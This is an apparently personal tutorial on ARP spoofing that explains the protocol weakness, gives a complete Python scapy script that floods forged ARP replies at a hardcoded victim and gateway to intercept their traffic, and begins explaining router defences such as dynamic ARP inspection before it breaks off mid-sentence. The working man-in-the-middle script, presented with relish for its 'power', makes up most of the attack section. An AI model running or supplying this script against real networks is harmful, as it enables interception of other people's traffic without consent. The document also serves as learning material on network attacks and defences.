# How to check if your router tries to protect you

**ARP Spoofing** also known as Man in the Middle is simple but powerful attack. It exploits the vulnerabilites of ARP (Address Resolution Protocol)

-------------------------------------------------------------------------------

## How ARP Spoofing Works

Normally these are how the computers in a network communicate (this works for ethernet switches).  

![Load](https://documentation.meraki.com/@api/deki/files/5903/Screen_Shot_2017-12-03_at_8.09.11_PM.png?revision=1&size=bestfit&width=622&height=242)

The victim (who is not the victim yet) sends an ARP broadcast to ask what are the MAC addresses of the machines with the given IP. For example, the ARP request asks who 10.10.10.20 is, the router has that IP and the router sends its MAC address to the machine that asked. The machine will then update its table so whenever it needs to send something to 10.10.10.20, it will send it to the MAC address that was given. You may now see what the vulnerability is. I could send a message to the victim saying that I'm 10.10.10.20 but give it **MY** MAC address. Now when it needs to send something to 10.10.10.20, it will send the requests to my MAC address. *The **power** feels great!*

![Get rekt](https://miro.medium.com/max/4800/1*Nz1e4AfW6HGcgXde_eIwUg.jpeg)

-------------------------------------------------------------------------------

## How the Code Works

Remember, we need to tell the victim that we're the router, so we'll create a packet doing just that. I should also say I used the library scapy.
```python
def spoof(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)
```
What this does is create a packet with packet destination (pdst) of the target, this tells them this packet was especially made for them, packet source (psrc) of the router so it looks like it's coming from them, and hwdst (hardware destination) is to send it to the right person. This packet will have a hwsrc (hardware source) of our IP so they associate our MAC address with the router's IP. 
```python
def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)
```
The code above is to reverse previous actions, telling the victim that the IP of router should be associated with the MAC of the router. You literally have to reverse it, showing the **power** of the attack. 
```python
def main():
    targetip = "192.168.0.24"
    gatewayip = "192.168.0.1"
    targetmac = "a4:5e:60:b9:d6:ab"
    gatewaymac = "9c:c9:eb:c9:1a:1a"

    try:
        print("Sending spoofed ARP responses")
        #restorearp(gatewayip, gatewaymac, targetip, targetmac)
        #restorearp(targetip, targetmac, gatewayip, gatewaymac)
        while True:
            spoof(targetip, targetmac, gatewayip)
            spoof(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
``` 
Here I specify the IP addresses and MAC addresses. You could automate this part, but if you have something like nmap or a network scanner (you can code this as well) you can find the addresses and manual code them in. Then we send the packets, we have to do this repeatedly so the victim thinks we're the router. If you want to turn it off, you can use Ctrl+C and it'll revert it. 

-------------------------------------------------------------------------------

## Why it may not work for you

I wasn't initially planning on making this section, but we got a new router and the spoofer doesn't wor anymore. This is actually a good thing, but not for this project. I started doing research to figure out what happened,

![Literally Me](data:image/jpeg;base64,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)

I was enlightenment with the knowledge of this random stackoverflow dude

>The spoof should work almost immediately if it is working properly. New devices will see the gratuitous arp from the attacker and automatically update their >cache. A victim will not detect duplicate IP, they should just update the mapping. The problem is likely at the router.
>
>Arpspoof works through a switch because the switch has no way of knowing which port the legitimate IP address/MAC mapping is, so without any form of port >security/DHCP snooping/Dynamic arp inspection, it has to trust that a device is who it says it is when it claims "192.168.1.1 is at aa:bb:cc:dd:ee:aa" in its >arp reply/gratuitous arp.
>                                                                                                                      ~Some dude on Stack Overflow

What this basically says is...
